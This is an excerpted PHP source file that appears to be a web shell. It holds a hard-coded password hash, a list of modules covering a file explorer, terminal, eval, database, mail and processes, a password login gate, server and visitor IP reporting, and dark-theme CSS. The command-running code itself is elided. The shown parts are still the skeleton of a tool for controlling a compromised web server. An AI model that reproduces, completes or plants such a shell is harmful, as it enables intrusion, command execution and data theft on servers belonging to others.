<?php
$GLOBALS['pass'] = "8edef4715d8da5972801057b202df9ccefa59b45";
$GLOBALS['module_to_load'] = array("explorer", "terminal", "eval", "convert", "database", "info", "mail", "processes");
	...
	function auth(){
		...
		";
			...
			if(!isset($c['pass']) || (isset($c['pass'])&&($c['pass']!=$GLOBALS['pass']))){
				$res = "
		<body style='background:#282C34;color:#ffffff;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
		<script type='text/javascript'>
		var d = document;
		d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:13px;width:144px;outline:none;text-align:center;background:#1E2127;padding:8px;border:1px solid #000000;border-radius:8px;color:#ffffff;'></center></form>\");
...
if(!function_exists('get_server_info')){
	function get_server_info(){
		...
		$server_realip = gethostbyname($_SERVER["HTTP_HOST"]);
		$server_info['ip_adrress'] = "Server IP : ".$server_realip." <a class='strong' href='https://ipinfo.io/".$server_realip."/json' target='_blank'>[IP Info]</a> <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
...
if(!function_exists('sql_get_supported')){
	function sql_get_supported(){
		...
		if(function_exists("mysql_connect") || class_exists('mysqli')) $db_supported[] = 'mysql';
...
@font-face {
	...
	src:url(data:application/x-font-woff;charset=utf-8;base64,) format('woff');
	font-weight: normal;
	font-style: normal;
}
*{
...
hr{
	margin:8px 0;
	border-bottom:1px dashed #181A1F;
}
video{
	width:100%;
	background:#222222;
...
.strong{
	color:#2D6396;
	text-shadow:0px 0px 1px #2D6396;
}
.weak{
	color:#666666;
}
...
.borderright{
	border-right:1px dashed #181A1F;
}
.borderleft{
	border-left:1px dashed #181A1F;
}
.hr td{
	border-bottom:1px dashed #181A1F;
}
